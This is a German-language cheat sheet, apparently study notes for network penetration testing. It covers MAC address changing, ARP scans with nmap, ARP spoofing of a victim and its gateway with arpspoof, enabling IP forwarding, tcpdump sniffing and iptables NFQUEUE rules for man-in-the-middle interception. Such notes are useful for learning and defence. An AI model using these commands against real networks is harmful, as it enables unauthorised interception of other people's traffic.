



# Ändern der MAC Adresse

```bash
# disable interface
$ ifconfig eth0 down
# change mac address
$ ifconfig eth0 hw ether 11:22:33:44:55:66
# enable interface
$ ifconfig eth0 up
```



# ARP Scan

```bash
$ nmap -sn -PR 192.168.178.75/24
# -sn  ... nur PING scan (kein PORT scan)
# -PR  ... ARP Scan
```



# ARP Cache anzeigen

```sh
$ arp -a                    
fritz.box (192.168.178.1) at e0:28:6d:7b:fa:91 [ether] on eth0
# -a BSD style output format
```

Dieses Kommando geht auch unter Windows (Ausgabe sieht anders aus).



# ARP Spoofing

Schickt einen ARP Response an das Opfer (`10.0.2.7`). Ändert die im Opfer abgelegt MAC Adresse des Gateways (`10.0.2.1`) auf die eigenen MAC Adresse:

```sh
$ arpspoof -i eth0 -t 10.0.2.7 10.0.2.1
# arpspoof -i <interface> -t <target-victim-ip> <router-ip>
```

Herausfinden des router (=default gateway):

```sh
$ route -n
```

Schickt einen ARP Response an das Gateway. Ändert die im Gateway abgelegte MAC Adresse des Opfers auf die eigene MAC Adresse:

```sh
$ arpspoof -i eth0 -t 10.0.2.1 10.0.2.7 
```

Nach diesen 2 `arpspoof` Aufrufen sind die ARP Caches vom Opfer und vom Gateway kompromitiert.

Aktivieren von IP forwarding:

```sh
echo 1 > /proc/sys/net/ipv4/ip_forward
```



# MAC Adresse herausfinden

Variante 1: anpingen und dann ARP Cache auslesen

```sh
$ ping 192.168.178.75
$ arp -a  
```

Variante 2: nmap

```sh
$ nmap -sn -PR 192.168.178.75
# -sn  ... nur PING scan (kein PORT scan)
# -PR  ... ARP Scan
```



# TCP dump

```sh
$ tcpdump -nA port 80
```



# iptables

Pakete eines **fremden Rechners** abfangen

```sh
$ iptables -I FORWARD -j NFQUEUE --queue-num 0
# -I <chain> ... specify chain to modify
#          FORWARD: received from another host
# -j <target> ... target of the rule
# NFQUEUE Netfilter Queue
# --queue-num <nr> queue number to access the queue
```

Pakete werden nicht mehr automatisch weitergeleitet sondern können in einem Programm verarbeitet werden (MITM).

Rücksetzten der Routing Regeln mit:

```sh
$ iptables --flush
```

Pakete des **lokalen Rechners** abfangen

`OUTPUT` chain: Pakete die vom lokalen Computer **gesendet** werden

`INPUT` chain: Pakete die vom lokalen Computer **empfangen** werden

```sh
$ iptables -I OUTPUT -j NFQUEUE --queue-num 0
$ iptables -I INPUT -j NFQUEUE --queue-num 0
```

